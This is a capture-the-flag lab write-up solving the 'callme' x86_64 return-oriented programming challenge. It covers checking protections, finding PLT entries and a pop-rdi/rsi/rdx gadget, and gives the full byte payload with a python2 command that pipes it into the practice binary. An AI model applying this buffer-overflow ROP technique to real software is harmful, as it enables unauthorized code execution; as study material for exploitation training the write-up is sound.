# callme x86 64
According to the descrption, we need to call the functions callme_one, callme_two, callme_three with three arguments in specific order.

Hint also tells that we need to call the functions through plt(procedure linkage table).

Check the security:
```
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
```
PIE is disabled, the we are able to use ret2function or rop.

Use ghidra to track the assembly code, and we will find that the program does not call functions callme_one, callme_two, callme_three. 

These functions are included from shared library, and their function address is stored in the plt table. We can find their function address in plt.
```
gdb-peda$ plt
...
Breakpoint 1 at 0x400720 (callme_one@plt)
Breakpoint 2 at 0x4006f0 (callme_three@plt)
Breakpoint 3 at 0x400740 (callme_two@plt)
```
We obtain three function address, before calling them we need to set the arguments properly.

Hint has told us that these functions need three parameters, which are 0xdeadbeefdeadbeef, 0xcafebabecafebabe, and 0xd00df00dd00df00d.

x86_64 calling convention tells us that the arguments are stored in the registers rdi, rsi, rdx, ...... 

Therefore, we need to set three parameters in rdi, rsi, rdx accordingly.

We find a suitable gadget in program.
```
...
0x000000000040093c : pop rdi ; pop rsi ; pop rdx ; ret
...
```
We use this gadget to set the arguments, and then jump to the plt function address, and repeated 3 times.
```
gadget -> call callme_one -> gadget -> call callme_two -> gadget -> call callme_three
```
Now, we can build our payload.

First, same as problems before, the overflow buffer is 32 bytes, and rbp register 8 bytes.
```
'A' * 32 + 'A' * 8
```
We jump to gadget address and set three arguments accordingly: 
```
0x000000000040093c(gadget adress) + 0xdeadbeefdeadbeef(arg1 pop into rdi) + 0xcafebabecafebabe(arg2 pop into rsi) + 0xd00df00dd00df00d(arg3 pop into rdx) 
```
Then jump to the function callme_one address in plt:
```
0x0000000000400720 (callme_one@plt)
```
callme_two, callme_three do the same pattern:
```
0x000000000040093c(gadget adress) + 0xdeadbeefdeadbeef(arg1 pop into rdi) + 0xcafebabecafebabe(arg2 pop into rsi) + 0xd00df00dd00df00d(arg3 pop into rdx) + 0x0000000000400740 (callme_two@plt)

0x000000000040093c(gadget adress) + 0xdeadbeefdeadbeef(arg1 pop into rdi) + 0xcafebabecafebabe(arg2 pop into rsi) + 0xd00df00dd00df00d(arg3 pop into rdx) + 0x00000000004006f0(callme_three@plt)

```
Finally, the payload will be:
```
'A'*40 + '\x3c\x09\x40\x00\x00\x00\x00\x00' + '\xef\xbe\xad\xde\xef\xbe\xad\xde' + '\xbe\xba\xfe\xca\xbe\xba\xfe\xca' + '\x0d\xf0\x0d\xd0\x0d\xf0\x0d\xd0' + '\x20\x07\x40\x00\x00\x00\x00\x00' + '\x3c\x09\x40\x00\x00\x00\x00\x00' + '\xef\xbe\xad\xde\xef\xbe\xad\xde' + '\xbe\xba\xfe\xca\xbe\xba\xfe\xca' + '\x0d\xf0\x0d\xd0\x0d\xf0\x0d\xd0' + '\x40\x07\x40\x00\x00\x00\x00\x00' + '\x3c\x09\x40\x00\x00\x00\x00\x00' + '\xef\xbe\xad\xde\xef\xbe\xad\xde' + '\xbe\xba\xfe\xca\xbe\xba\xfe\xca' + '\x0d\xf0\x0d\xd0\x0d\xf0\x0d\xd0' + '\xf0\x06\x40\x00\x00\x00\x00\x00'
```
Execute program with payload:
```
python2 -c "print 'A'*40 + '\x3c\x09\x40\x00\x00\x00\x00\x00' + '\xef\xbe\xad\xde\xef\xbe\xad\xde' + '\xbe\xba\xfe\xca\xbe\xba\xfe\xca' + '\x0d\xf0\x0d\xd0\x0d\xf0\x0d\xd0' + '\x20\x07\x40\x00\x00\x00\x00\x00' + '\x3c\x09\x40\x00\x00\x00\x00\x00' + '\xef\xbe\xad\xde\xef\xbe\xad\xde' + '\xbe\xba\xfe\xca\xbe\xba\xfe\xca' + '\x0d\xf0\x0d\xd0\x0d\xf0\x0d\xd0' + '\x40\x07\x40\x00\x00\x00\x00\x00' + '\x3c\x09\x40\x00\x00\x00\x00\x00' + '\xef\xbe\xad\xde\xef\xbe\xad\xde' + '\xbe\xba\xfe\xca\xbe\xba\xfe\xca' + '\x0d\xf0\x0d\xd0\x0d\xf0\x0d\xd0' + '\xf0\x06\x40\x00\x00\x00\x00\x00'" | ./callme
```
We obtain the flag:
```
ROPE{a_placeholder_32byte_flag!}
```

